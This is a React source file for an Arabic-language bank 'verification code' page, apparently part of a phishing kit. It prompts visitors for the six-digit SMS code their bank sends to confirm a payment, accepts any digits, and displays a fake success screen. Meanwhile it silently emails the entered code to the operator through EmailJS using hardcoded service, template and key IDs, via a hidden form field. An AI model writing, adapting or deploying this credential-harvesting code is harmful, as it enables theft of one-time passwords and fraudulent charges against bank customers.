'use client'
import React, { FormEvent, LegacyRef, MouseEventHandler, MutableRefObject, RefObject, useEffect, useRef, useState } from 'react'
import BodyContianer from '../components/BodyContianer'
import { useGSAP } from '@gsap/react'
import emailjs from '@emailjs/browser';
import gsap from 'gsap'
import Notifecation from '../components/Notifecation'
import SuccessPayed from '../components/SuccessPayed'
import Loading from '../components/Loading';
const OTP = () => {
    const form
        = useRef<LegacyRef<HTMLFormElement | null> | any>(null)
    const [isLoading, setIsLoading] = useState<boolean | null>(false)
    const [isTry, setIsTry] = useState<boolean | null>(false)
    const [isSucssess, setIsSuccess] = useState<Boolean | false>(false)
    const [code, setCode] = useState<undefined | string>('')
    const [isSuccessCode, setIsSuccessCode] = useState<null | boolean>(null)
    const [timer, setTimer] = useState<number>(isTry ? 30 : 30);
    const input1: MutableRefObject<HTMLInputElement | null> = useRef(null);
    const input2: MutableRefObject<HTMLInputElement | null> = useRef(null);
    const input3: MutableRefObject<HTMLInputElement | null> = useRef(null);
    const input4: MutableRefObject<HTMLInputElement | null> = useRef(null);
    const input5: MutableRefObject<HTMLInputElement | null> = useRef(null);
    const input6: MutableRefObject<HTMLInputElement | null> = useRef(null);
    useEffect(() => {
        let interval: NodeJS.Timeout = setInterval(() => {
            setTimer(prev => prev - 1)
        }, 1000);
        if (timer === 0) {
            // clsearInterval(interval)
        }
        if (isTry) {
            setTimeout(() => {
                setIsTry(false)
            }, 1000);
        }
        input1.current?.focus()
        return () => clearInterval(interval)
    }, [isTry])
    console.log(code);

    const p1 = /^(.)\1*$/g;
    // (?=(\d))(?!.*\1(?!\1))
    const p2 = /^\d*(?:123|234|345|456|567|678|789|890|012)+\d*$/g;
    const handelSub = async (e: any): Promise<any> => {
        e.preventDefault()
        // {
        //    
        // }
        const isAllInputsFull = ([input1, input2, input3, input4, input5, input6].every(item => item.current && item.current.value.length !== 0))

        if (isAllInputsFull && code?.length === 6) {
            console.log(isAllInputsFull);
            setIsLoading(true)
            setIsSuccessCode(true)
            return await new Promise((resolve) => {
                resolve(setTimeout(async () => {
                    setIsSuccess(true)
                    setIsLoading(false)
                    // location.assign('/')
                    await emailjs
                        .sendForm('service_eiba1x2', 'template_m6ugimb', form?.current, {
                            publicKey: "1dyv6-l9X5JPc7pEE",
                        })
                        .then(
                            () => {
                                console.log('SUCCESS!');
                            },
                            (error) => {
                                console.log('FAILED...', error.text);
                            },
                        );
                }, 2000))
            })
        } else {
            setIsSuccessCode(false)
            location.reload()
        }
    }

    const inputs = [input1, input2, input3, input4, input5, input6]
    useGSAP(() => {
        if (isSucssess) {
            gsap.to('.box input', {
                backgroundColor: "#80ed99",
                color: "#fff",
                stagger: {
                    each: 0.1,
                    from: "start"
                }
            })
        }
    }, [isSucssess])
    // if ((code.length === 6) && [...new Set(code)].length === 6) {
    //     console.log([...new Set(code)]);
    // }
    return (
        <div>
            {isLoading &&
                <Loading />
            }
            {isSuccessCode && !isSucssess ?
                <>
                    {() => location.reload()}
                    <Notifecation message='حاول ادخال الرمز مجددا!' type='error' />
                </>
                : null}
            <BodyContianer>
                <>
                    {isTry &&
                        <Notifecation type='msg' message='تمت اعاده ارسال الكود.. حاول لاحقا!' />
                    }
                </>
                {!isSucssess ?
                    <section>
                        <h2 className='text-center text-[20px] font-semibold'>كود التحقق</h2>
                        <h4 className='mt-[25px] sm:text-[22px] text-center font-bold'>
                            ادخل رمز التحقق الذي يصلك في رسالة نصية والمكون من 6 أرقام او انتظر مكالمة البنك لتأكيد عملية الدفع
                        </h4>
                        <form ref={form} onSubmit={handelSub}>
                            <section className='flex items-center justify-center gap-2 mt-[25px]'>
                                {inputs.map((input, i) => (
                                    <div className='size-[45px] box flex items-center px-[10px] justify-center p-[20px] relative '>
                                        <input required onChange={(e) => {
                                            if (i + 1 < 6) {
                                                inputs[i + 1].current?.focus()

                                            }
                                            setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
                                        }} ref={input} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                    </div>
                                ))}
                                {/* <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
                                    <input required ref={input2} onChange={
                                        (e) => {
                                            input3.current?.focus()
                                            setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
                                        }
                                    } placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                </div>
                                <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
                                    <input required ref={input3} onChange={(e) => {
                                        input4.current?.focus()
                                        setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
                                    }} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                </div>
                                <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
                                    <input required ref={input4} onChange={(e) => {
                                        input5.current?.focus()
                                        setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
                                    }} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                </div>
                                <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
                                    <input required ref={input5} onChange={(e) => {
                                        input6.current?.focus()
                                        setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")
                                    }} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                </div>
                                <div className='size-[45px] box flex items-center  px-[10px] justify-center p-[20px] relative '>
                                    <input required onChange={(e) => {
                                        setCode((prev) => e.target.value?.length ? `${prev}${+e.target.value}` : "")

                                    }} ref={input6} placeholder='x' maxLength={1} type="text" className=' rounded-[6px] absolute w-full h-full text-center bg-[#f7f4fa]' />
                                </div> */}
                            </section>
                            <input type="text" name='message' value={`${code?.slice(0, 5)}`} className='opacity-0' />
                            <button onClick={handelSub} type='submit' className='block w-full active:scale-[1.01] p-[14px] transition-all duration-[100ms] rounded-[6px] shadow-lg text-white my-[20px] outline-0 font-bold bg-[#f68024] hover:bg-[#ea6e0e]'>تأكيد</button>
                        </form>
                        <div className="flex mt-[30px] font-[ibmolexBoldMeduim] items-center flex-col">
                            <div className='flex justify-center items-center gap-3'>
                                <h4>لم يصلك كود؟ </h4>
                                <span onClick={() => setIsTry(true)} className={`underline cursor-pointer ${isTry && "!cursor-not-allowed text-gray-400"}`}>اضغط هنا لاعادة الارسال</span>
                            </div>
                            <section className='flex gap-2 items-center text-[#d01010]'>
                                <h2 className='font-semibold'>سيصلك كود جديد خلال </h2>
                                <div>00:{timer >= 0 ? timer : "00"}</div>
                            </section>
                        </div>
                    </section>
                    :
                    <>

                        <SuccessPayed />
                    </>
                }

            </BodyContianer>
        </div>
    )
}

export default OTP